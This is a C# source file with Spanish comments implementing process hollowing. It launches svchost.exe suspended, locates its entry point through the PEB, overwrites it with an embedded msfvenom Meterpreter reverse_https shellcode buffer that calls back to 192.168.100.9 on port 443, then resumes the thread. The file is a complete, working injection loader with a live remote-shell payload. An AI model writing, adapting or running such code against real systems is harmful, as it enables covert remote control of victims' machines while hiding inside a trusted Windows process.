using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProcessHollowingSimple
{
    class Program
    {
        #region CreateProcess
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        #endregion

        #region NtQueryInformationProcess
        private enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0x00,
            ProcessQuotaLimits = 0x01,
            ProcessIoCounters = 0x02,
            ProcessVmCounters = 0x03,
            ProcessTimes = 0x04,
            ProcessBasePriority = 0x05,
            ProcessRaisePriority = 0x06,
            ProcessDebugPort = 0x07,
            ProcessExceptionPort = 0x08,
            ProcessAccessToken = 0x09,
            ProcessLdtInformation = 0x0A,
            ProcessLdtSize = 0x0B,
            ProcessDefaultHardErrorMode = 0x0C,
            ProcessIoPortHandlers = 0x0D,
            ProcessPooledUsageAndLimits = 0x0E,
            ProcessWorkingSetWatch = 0x0F,
            ProcessUserModeIOPL = 0x10,
            ProcessEnableAlignmentFaultFixup = 0x11,
            ProcessPriorityClass = 0x12,
            ProcessWx86Information = 0x13,
            ProcessHandleCount = 0x14,
            ProcessAffinityMask = 0x15,
            ProcessPriorityBoost = 0x16,
            ProcessDeviceMap = 0x17,
            ProcessSessionInformation = 0x18,
            ProcessForegroundInformation = 0x19,
            ProcessWow64Information = 0x1A,
            ProcessImageFileName = 0x1B,
            ProcessLUIDDeviceMapsEnabled = 0x1C,
            ProcessBreakOnTermination = 0x1D,
            ProcessDebugObjectHandle = 0x1E,
            ProcessDebugFlags = 0x1F,
            ProcessHandleTracing = 0x20,
            ProcessIoPriority = 0x21,
            ProcessExecuteFlags = 0x22,
            ProcessResourceManagement = 0x23,
            ProcessCookie = 0x24,
            ProcessImageInformation = 0x25,
            ProcessCycleTime = 0x26,
            ProcessPagePriority = 0x27,
            ProcessInstrumentationCallback = 0x28,
            ProcessThreadStackAllocation = 0x29,
            ProcessWorkingSetWatchEx = 0x2A,
            ProcessImageFileNameWin32 = 0x2B,
            ProcessImageFileMapping = 0x2C,
            ProcessAffinityUpdateMode = 0x2D,
            ProcessMemoryAllocationMode = 0x2E,
            ProcessGroupInformation = 0x2F,
            ProcessTokenVirtualizationEnabled = 0x30,
            ProcessConsoleHostProcess = 0x31,
            ProcessWindowInformation = 0x32,
            ProcessHandleInformation = 0x33,
            ProcessMitigationPolicy = 0x34,
            ProcessDynamicFunctionTableInformation = 0x35,
            ProcessHandleCheckingMode = 0x36,
            ProcessKeepAliveCount = 0x37,
            ProcessRevokeFileHandles = 0x38,
            ProcessWorkingSetControl = 0x39,
            ProcessHandleTable = 0x3A,
            ProcessCheckStackExtentsMode = 0x3B,
            ProcessCommandLineInformation = 0x3C,
            ProcessProtectionInformation = 0x3D,
            ProcessMemoryExhaustion = 0x3E,
            ProcessFaultInformation = 0x3F,
            ProcessTelemetryIdInformation = 0x40,
            ProcessCommitReleaseInformation = 0x41,
            ProcessDefaultCpuSetsInformation = 0x42,
            ProcessAllowedCpuSetsInformation = 0x43,
            ProcessSubsystemProcess = 0x44,
            ProcessJobMemoryInformation = 0x45,
            ProcessInPrivate = 0x46,
            ProcessRaiseUMExceptionOnInvalidHandleClose = 0x47,
            ProcessIumChallengeResponse = 0x48,
            ProcessChildProcessInformation = 0x49,
            ProcessHighGraphicsPriorityInformation = 0x4A,
            ProcessSubsystemInformation = 0x4B,
            ProcessEnergyValues = 0x4C,
            ProcessActivityThrottleState = 0x4D,
            ProcessActivityThrottlePolicy = 0x4E,
            ProcessWin32kSyscallFilterInformation = 0x4F,
            ProcessDisableSystemAllowedCpuSets = 0x50,
            ProcessWakeInformation = 0x51,
            ProcessEnergyTrackingState = 0x52,
            ProcessManageWritesToExecutableMemory = 0x53,
            ProcessCaptureTrustletLiveDump = 0x54,
            ProcessTelemetryCoverage = 0x55,
            ProcessEnclaveInformation = 0x56,
            ProcessEnableReadWriteVmLogging = 0x57,
            ProcessUptimeInformation = 0x58,
            ProcessImageSection = 0x59,
            ProcessDebugAuthInformation = 0x5A,
            ProcessSystemResourceManagement = 0x5B,
            ProcessSequenceNumber = 0x5C,
            ProcessLoaderDetour = 0x5D,
            ProcessSecurityDomainInformation = 0x5E,
            ProcessCombineSecurityDomainsInformation = 0x5F,
            ProcessEnableLogging = 0x60,
            ProcessLeapSecondInformation = 0x61,
            ProcessFiberShadowStackAllocation = 0x62,
            ProcessFreeFiberShadowStackAllocation = 0x63,
            MaxProcessInfoClass = 0x64
        };

        private struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
        #endregion

        #region NtCreateSection

        /// <summary>Win32 constants</summary>
        internal const int SECTION_MAP_WRITE = 0x0002;
        /// <summary>Win32 constants</summary>
        internal const int SECTION_MAP_READ = 0x0004;
        /// <summary>Win32 constants</summary>
        internal const int SECTION_MAP_EXECUTE = 0x0008;
        #endregion

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           ref SECURITY_ATTRIBUTES lpProcessAttributes,
           ref SECURITY_ATTRIBUTES lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref STARTUPINFO lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("NTDLL.DLL", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            PROCESSINFOCLASS pic,
            out PROCESS_BASIC_INFORMATION pbi,
            int processInformationLength,
            out int returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          IntPtr lpBuffer,
          Int32 nSize,
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        public const uint PAGE_READWRITE = 0x04;

        public const uint PAGE_EXECUTE_READ = 0x20;

        public const uint SEC_COMMIT = 0x8000000;

        static void Main(string[] args)
        {
            // SHELLCODE
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.9 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[715] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,
0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x41,0x58,0x5e,0x59,0x48,0x01,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x30,
0x30,0x2e,0x39,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5c,0x11,0x00,0x00,
0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
0x00,0x00,0x00,0xff,0xd5,0xe8,0xa1,0x00,0x00,0x00,0x2f,0x45,0x76,0x6a,0x37,
0x6f,0x66,0x6b,0x49,0x76,0x5a,0x64,0x6e,0x76,0x47,0x61,0x2d,0x42,0x62,0x42,
0x4f,0x44,0x51,0x6f,0x48,0x6e,0x78,0x5a,0x4e,0x7a,0x61,0x7a,0x76,0x52,0x48,
0x56,0x30,0x7a,0x6c,0x6a,0x76,0x6c,0x69,0x46,0x78,0x77,0x68,0x6c,0x75,0x41,
0x4a,0x31,0x71,0x69,0x68,0x4f,0x63,0x6c,0x6e,0x59,0x65,0x74,0x78,0x48,0x4c,
0x50,0x58,0x41,0x61,0x66,0x75,0x33,0x2d,0x52,0x41,0x57,0x39,0x47,0x4c,0x4e,
0x4f,0x77,0x36,0x4c,0x5a,0x42,0x79,0x43,0x4a,0x6d,0x71,0x56,0x58,0x6e,0x47,
0x50,0x5f,0x4c,0x6d,0x57,0x44,0x37,0x37,0x62,0x77,0x6d,0x61,0x63,0x52,0x4b,
0x73,0x70,0x41,0x75,0x7a,0x58,0x45,0x4e,0x42,0x58,0x6d,0x33,0x75,0x6c,0x78,
0x78,0x7a,0x4e,0x47,0x4a,0x41,0x42,0x5a,0x5a,0x30,0x79,0x39,0x76,0x77,0x61,
0x69,0x6c,0x53,0x6b,0x33,0x37,0x62,0x73,0x71,0x41,0x2d,0x71,0x34,0x74,0x53,
0x73,0x58,0x4a,0x7a,0x6e,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,
0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,
0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,
0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,
0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,
0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,
0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,
0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,
0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,
0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,
0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,
0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,
0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,
0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,
0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,
0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };


            //string shellcodeb64 = "";
            //buf = null;
            //buf = Convert.FromBase64String(shellcodeb64);

            // Variables para la creación del proceso
            // Process Name
            string ProcName = @"C:\Windows\System32\svchost.exe";

            // STARTUPINFO
            STARTUPINFO si = new STARTUPINFO();

            // PROCESS_INFORMATION
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // SECURITY_ATTRIBUTES 
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            // Create Process en modo SUSPENDED  (CreateProcess)
            bool status = CreateProcess(null, ProcName, ref pSec, ref tSec, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            Console.WriteLine("[+] Proceso creado en modo suspendido.");
            Console.WriteLine("\t-> Nombre del proceso  : " + ProcName);
            Console.WriteLine("\t-> ID del proceso      : " + pi.dwProcessId);
            Console.WriteLine("\t-> ID del thread (hilo): " + pi.dwThreadId);

            // Variables para consultar la información del proceso
            // Process Handle
            IntPtr pHandle = pi.hProcess;

            // PROCESS_BASIC_INFORMATION
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            
            // PROCESSINFOCLASS
            PROCESSINFOCLASS pic = new PROCESSINFOCLASS();

            // returnLength
            int returnLength;

            // Obtener la información del proceso para buscar el PEB (NtQueryInformationProcess)
            int resultNtQuery = NtQueryInformationProcess(pHandle, pic, out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out returnLength);

            Console.WriteLine("\n[+] Informacion del proceso " + ProcName + " obtenida.");
            Console.WriteLine("\t-> PEB: 0x{0:X16}", pbi.PebBaseAddress.ToInt64());

            // Calculo de la ubicación del valor del ImageBaseAddress - WinDBG
            IntPtr ptrImageBase = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);

            // Variables para guardar el valor de ImageBaseAddress
            // ImageBaseAddress byte
            byte[] ImageBaseAddress = new byte[8];

            // bytesRead 
            IntPtr bytesRead;

            // Leer 8 bytes de memoria en la ubicación del PEB para obtener la dirección del ImageBaseAddress (ReadProcessMemory)
            status = ReadProcessMemory(pHandle, ptrImageBase, ImageBaseAddress, 8, out bytesRead);
            
            IntPtr ProcessBaseAddr = (IntPtr)BitConverter.ToInt64(ImageBaseAddress, 0);

            Console.WriteLine("\t-> ImageBaseAddress: 0x{0:X16}", ProcessBaseAddr.ToInt64());

            // Variable para almacenar el contenido de la memoria
            byte[] dataPE = new byte[0x200];

            // Leer 512 Bytes de memoria en la ubicación del ImageBaseAddress (ReadProcessMemory)
            status = ReadProcessMemory(pHandle, ProcessBaseAddr, dataPE, dataPE.Length, out bytesRead);

            // Obtener el valor de e_lfanew 
            // 0x3C - Ubicación
            uint e_lfanew = BitConverter.ToUInt32(dataPE, 0x3C);

            // Obtener el valor de opthdr (optional header a partir del e_lfanew)
            // e_lfanew + 0x28
            uint opthdr = e_lfanew + 0x28;

            // Obtener el valor del entrypoint_rva
            uint entrypoint_rva = BitConverter.ToUInt32(dataPE, (int)opthdr);

            // Obtener el valor del AddressOfEntryPoint
            // entrypoint_rva + ImageBaseAddress
            IntPtr addressOfEntryPoint = (IntPtr)((UInt64)ProcessBaseAddr + entrypoint_rva);

            Console.WriteLine(" | -> addressOfEntryPoint: 0x{0:X16}", addressOfEntryPoint.ToInt64());
            
            // Copiar el shellcode al AddressOfEntryPoint
            IntPtr readbytes;
            WriteProcessMemory(pHandle, addressOfEntryPoint, buf, buf.Length, out readbytes);

            // Resumir el Thread (ResumeThread)
            ResumeThread(pi.hThread);
            
            Console.ReadLine();
        }
    }
}
